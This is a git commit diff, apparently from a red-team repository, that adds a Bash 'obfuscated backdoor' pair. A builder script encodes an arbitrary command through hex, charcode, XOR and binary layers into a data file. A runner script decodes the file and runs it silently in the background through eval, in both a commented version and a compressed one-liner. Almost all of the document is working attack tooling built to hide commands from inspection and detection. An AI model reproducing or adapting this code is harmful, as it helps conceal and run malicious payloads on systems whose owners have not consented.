174512c9cdb813fdc525d3a076c06cb65c1c7002
root <git@tdcme.com>
2023-06-15 12:13:04 -0700

    Bash Obfuscated Backdoor added

--- RedTeam/LinuxBashBackDoor_Builder.sh
+++ RedTeam/LinuxBashBackDoor_Builder.sh
@@ -1,31 +1,69 @@
 #!/bin/bash
 
 obfBd() {
-    local input="${1}"
-    local output="./data.dat"
+    # Variable to store the plain text input
+    local inputPayload="${1}"
+
+    # Variable to store the output file path
+    local outputFile="./data.dat"
+
+    # Colors for output
+    RED='\033[0;31m'
+    NC='\033[0m' # No Color
+
     # If "${2}" is empty, or has a value less than 1, then use the default vaolume of 42 for the XOR key. Otherwise, use the value of "${2}" as the XOR key.
     if [[ -z "${2}" ]] || [[ "${2}" -lt 1 ]]; then
         local xorKey=42
     else
         local xorKey="${2}"
     fi
-    # XOR function
-    xor() { K=$1;shift;R="";for i in $@; do R="$R $(($i^$K))";done;echo "$R";}
+    # XOR function using a bitwise XOR operation.
+    xor(){
+        xorKey="$1"
+        shift
+        R=""
+        for i in $@; do
+            # Xor the decimal with the XOR key. Bitwise XOR operation.
+            R="$R "$(($i^$xorKey))""
+        done
+        # Return the result.
+        echo "$R"
+    }
 
-    # Convert the input to hex, charcode, dec, xor, and bin
-    toHex="$(echo -n "${input}" | xxd -ps -c 1 | awk -F '\n' '{OFS=":"; for(i=1;i<=NF;i++) printf "%s%s", "\\x"$i, (i==NF)?"":";"}')"
-    echo "HEX: ${toHex}"
-    toCharcode="$(echo -n "${toHex}" | od -An -t x1 | tr ' ' ';' | tr -d '\n')"
-    echo "CHARCODE: ${toCharcode}"
-    toDec="$(echo -n "${toCharcode}" | while IFS= read -r -n1 char; do printf "%d " "'${char}'"; done)"
-    echo "DEC: ${toDec}"
-    toXor="$(xor ${xorKey} "${toDec}" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
-    echo "XOR: ${toXor}"
-    toBin="$(echo -n "${toXor}" | xxd -b -c1 | awk '{print $2}' | tr '\n' ' ')"
-    echo "BIN: ${toBin}"
-    echo -n "${toBin}" > "${output}"
-    echo "Obfuscation complete. Output file: ${output}"
+    # Convert the plain text input to hex
+    Hex="$(echo -n "${inputPayload}" | xxd -ps -c 1 | awk -F '\n' '{OFS=":"; for(i=1;i<=NF;i++) printf "%s%s", "\\x"$i, (i==NF)?"":";"}')"
+    printf "${RED}Hex:${NC}";echo "${Hex}"
+
+    # Convert the hex to charcode
+    Charcode="$(echo -n "${Hex}" | od -An -t x1 | tr ' ' ';' | tr -d '\n')"
+    printf "${RED}Charcode:${NC} ${Charcode}\n"
+
+    # Convert the charcode to decimal
+    Decimal="$(echo -n "${Charcode}" | while IFS= read -r -n1 char; do printf "%d " "'${char}'"; done)"
+    printf "${RED}Decimal:${NC} ${Decimal}\n"
+
+    # XOR the decimal with the XOR key
+    Xor="$(xor "${xorKey}" "${Decimal}" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
+    printf "${RED}XOR Decimal:${NC} ${Xor}\n"
+
+    # Convert the XOR'd decimal to binary
+    Binary="$(echo -n "${Xor}" | xxd -b -c1 | awk '{print $2}' | tr '\n' ' ')"
+    printf "${RED}Binary:${NC} ${Binary}\n"
+
+    # Write the binary to the output file
+    echo -n "${Binary}" > "${outputFile}"
+    printf "${RED}Obfuscation complete. Output file:${NC} ${outputFile}"
 }
+
+# This function is a slimmed down version of the above function. It does not include the intermediate steps.
+obfBdSlim() {
+    if [[ -z "${2}" ]] || [[ "${2}" -lt 1 ]];then k=42;else k="${2}";fi
+    for i in $(echo -n "${1}"|xxd -ps -c 1|awk -F '\n' '{OFS=":"; for(i=1;i<=NF;i++) printf "%s%s", "\\x"$i, (i==NF)?"":";"}' \
+    |od -An -t x1|tr ' ' ';'|tr -d '\n'|while IFS= read -r -n1 c; do printf "%d " "'${c}'";done); do R="$R (($i^$k))";done
+    sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//'<<<"$R"|xxd -b -c1|awk '{print $2}'|tr '\n' ' ' >"./data.dat"
+}
+
 
 # Call the encrypt function with the provided command line argument
 obfBd "${1}" "${2}"
+# obfBdSlim "${1}" "${2}"
--- RedTeam/LinuxBashBackDoor_runner.sh
+++ RedTeam/LinuxBashBackDoor_runner.sh
@@ -1,15 +1,70 @@
 #!/bin/bash
 
-decrypt() {
-    i="$(cat "${1}")"
-    xorKey=42
-    xor() { K=$1;shift;R="";for i in $@; do R="$R $(($i^$K))";done;echo "$R";}
-    fromBin="$(for a in ${i} ; do printf "%x" $((2#$a)); done | xxd -r -p)"
-    fromXor="$(xor ${xorKey} "${fromBin}" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
-    fromDec="$(awk '{for (i=1; i<=NF; i++) printf "%c", $i}'<<<"${fromXor}")"
-    fromChar="$(sed 's/;/\n/g' <<<"${fromDec}" | sed '/^$/d' | sed 's/^0x//g' | xargs -I{} printf "\\x{}")"
-    echo -e "${fromChar}"
-    eval $"$(echo -e "${fromChar}")" &
+deobfBd() {
+    # Get the contents of the binary file, which is the payload.
+    Binary="$(cat "${1}")"
+
+    # The XOR key used to encrypt the payload.
+    # If "${2}" is empty, or has a value less than 1, then use the default vaolume of 42 for the XOR key. Otherwise, use the value of "${2}" as the XOR key.
+    if [[ -z "${2}" ]] || [[ "${2}" -lt 1 ]]; then
+        local xorKey=42
+    else
+        local xorKey="${2}"
+    fi
+
+    # Colors for output
+    RED='\033[0;31m'
+    NC='\033[0m' # No Color
+
+    # XOR function using a bitwise XOR operation.
+    xor(){
+        xorKey="$1"
+        shift
+        R=""
+        for i in $@; do
+            # Xor the decimal with the XOR key. Bitwise XOR operation.
+            R="$R "$(($i^$xorKey))""
+        done
+        # Return the result.
+        echo "$R"
+    }
+
+    # Output the binary to show the contents of the binary file.
+    printf "${RED}Binary:${NC} ${Binary}\n"
+
+    # Convert the binary to Xor-ed decimal.
+    XorDecimal="$(for a in ${Binary} ; do printf "%x" $((2#$a)); done | xxd -r -p)"
+    printf "${RED}XOR Decimal:${NC} ${XorDecimal}\n"
+
+    # Convert the Xor-ed decimal to decimal.
+    Decimal="$(xor ${xorKey} "${XorDecimal}" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
+    printf "${RED}Decimal:${NC} ${Decimal}\n"
+
+    # Convert the decimal to charcode.
+    Charcode="$(awk '{for (i=1; i<=NF; i++) printf "%c", $i}'<<<"${Decimal}")"
+    printf "${RED}Charcode:${NC} ${Charcode}\n"
+
+    # Convert the charcode to hex.
+    Hex="$(sed 's/;/\n/g' <<<"${Charcode}" | sed '/^$/d' | sed 's/^0x//g' | xargs -I{} printf "\\x{}")"
+    printf "${RED}Hex:${NC}";echo "${Hex}"
+
+    # Convert the hex to plain text. This is not needed, only here for demonstration purposes. Eval can read the hex code as a string and execute it as a command.
+    PlainText="$(echo -e "${Hex}")"
+    printf "${RED}PlainText:${NC} ${PlainText}\n"
+
+    # Run the hex code as a command. This will execute the payload. Eval can read the hex code as a string and execute it as a command. The "&" at the end of the command will run the command in the background.
+    eval $"$(echo -e "${Hex}")" &
 }
 
-decrypt "${1}"
+# This function is a slimmed down version of the above function. It does not include the intermediate steps.
+deobfBdSlim() {
+    x(){ K=$1;shift;R="";for i in $@; do R="$R $(($i^$K))";done;echo "$R";}
+    eval $"$(echo -e "$(sed 's/;/\n/g' <<<"$(awk '{for (i=1; i<=NF; i++) printf "%c", $i}'<<<\
+    "$(x "${2}" "$(for a in $(cat "${1}");do printf "%x" $((2#$a));done|xxd -r -p)"\
+    |sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')")"|sed '/^$/d'|sed 's/^0x//g'|xargs -I{} printf "\\x{}")")" &
+}
+
+
+# deobfBd "${1}" "42"
+deobfBdSlim "${1}" "42"
+
